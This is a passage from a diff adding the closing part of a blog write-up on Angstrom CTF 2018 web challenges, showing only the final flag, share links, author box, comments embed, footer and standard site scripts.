+  ]
+}
+ 
+</code></pre></div></div>
+
+<p><strong>Flag: actf{0bj3ct_ids_ar3nt_s3cr3ts}</strong></p>
+
+</div>
+        </article>
+        <div class="cf"></div>
+        <div class="row text-center">
+            <section class="notepad-post-share">
+                <a class="twitter-icon" href="https://twitter.com/intent/tweet?text=&quot;Angstrom CTF 2018 : Web Challenges&quot;%20http://localhost:4000/ctf/writeup-angstromctf-web-challenges%20via%20&#64;abdilahrf"
+                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" title="Share on Twitter">
+                    <i class="fa fa-twitter"></i>
+                </a>
+                <a class="facebook-icon" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/ctf/writeup-angstromctf-web-challenges"
+                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;" title="Share on Facebook">
+                    <i class="fa fa-facebook"></i>
+                </a>
+                <a class="google-icon" href="https://plus.google.com/share?url=http://localhost:4000/ctf/writeup-angstromctf-web-challenges"
+                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;" title="Share on Google+">
+                    <i class="fa fa-google-plus"></i>
+                </a>
+            </section>
+        </div>
+        <div class="cf"></div>
+        
+            <div class="notepad-author-info">
+                <div class="row">
+                    <section class="notepad-post-author small-12 columns">
+                        
+                            <img src="https://avatars2.githubusercontent.com/u/6015012?v=3&s=460" class="notepad-post-author-avatar" alt="Abdillah Muhamad's photo">
+                        
+                        
+                            <span class="author-label">Author</span>
+                            <h1>Abdillah Muhamad</h1>
+                        
+                        
+                            <p><a href="mailto:hasny1337@gmail.com" class="author-website">hasny1337@gmail.com</a></p>
+                        
+                        
+                            <p>Coffe make you like a hero</p>
+                        
+                    </section>
+                </div>
+            </div>
+ 
+        
+        <div class="cf"></div>
+        
+        <section class="notepad-disqus row">
+    <div class="small-12 columns">
+        <h1 class="notepad-comments-header">Comments</h1>
+        <div id="disqus_thread"></div>
+        <script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'abdilahrf'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function () {
+        var s = document.createElement('script'); s.async = true;
+        s.type = 'text/javascript';
+        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+    }());
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+</section>
+
+        <div class="cf"></div>
+
+    <footer class="notepad-site-footer">
+    <div class="copyright">
+         <section>All content copyright <a href="http://localhost:4000/about">Abdillah Muhamad</a> &copy; 2018 &bull; All rights reserved.</section>
+         <section>Proudly published with <a class="icon-ghost" href="https://jekyllrb.com/">Jekyll</a></section>
+    </div>
+    <div class="social-icons">
+        
+        
+        <a href="http://twitter.com/abdilahrf">
+            <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
+                <i class="fa fa-twitter fa-stack-1x"></i>
+            </span>
+        </a>
+        
+        
+        <a href="https://plus.google.com/">
+            <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
+                <i class="fa fa-google-plus fa-stack-1x"></i>
+            </span>
+        </a>
+        
+        
+        
+        <a href="http://github.com/abdilahrf">
+            <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
+                <i class="fa fa-github fa-stack-1x"></i>
+            </span>
+        </a>
+        
+        
+        <a href="http://facebook.com/abdilah.jk">
+            <span class="fa-stack fa-lg">
+                <i class="fa fa-circle fa-stack-2x fa-inverse"></i>
+                <i class="fa fa-facebook fa-stack-1x"></i>
+            </span>
+        </a>
+        
+    </div>
+    
+    <div class="cf"></div>
+</footer> 
+</main>    
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+    <script>window.jQuery || document.write('<script src="http://localhost:4000/assets/js/vendor/jquery-1.11.1.min.js"><\/script>')</script>
+    <script src="http://localhost:4000/assets/js/vendor/modernizr.js"></script>
+    <script src="http://localhost:4000/assets/js/foundation.min.js"></script>
+    
+    <script src="http://localhost:4000/assets/js/notepad.js"></script>
+    <script src="http://localhost:4000/assets/js/scripts.min.js"></script>
+    <script src="http://localhost:4000/assets/js/vendor/nprogress.js"></script>
+
+    <script>
+      $(document).foundation();
+    </script>
+    <script type='text/javascript'>console.log("@abdilahrf");</script>
+    <script type='text/javascript'>console.log("https://abdilahrf.me");</script>
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-96190645-1', 'auto');
+  ga('require', 'displayfeatures');
+  ga('send', 'pageview');
+
+</script>
+
+<script>NProgress.start();var interval=setInterval(function(){NProgress.inc()},1000);jQuery(window).load(function(){clearInterval(interval);NProgress.done()});jQuery(window).unload(function(){NProgress.start()});</script>
+ 
+</body>
+</html>
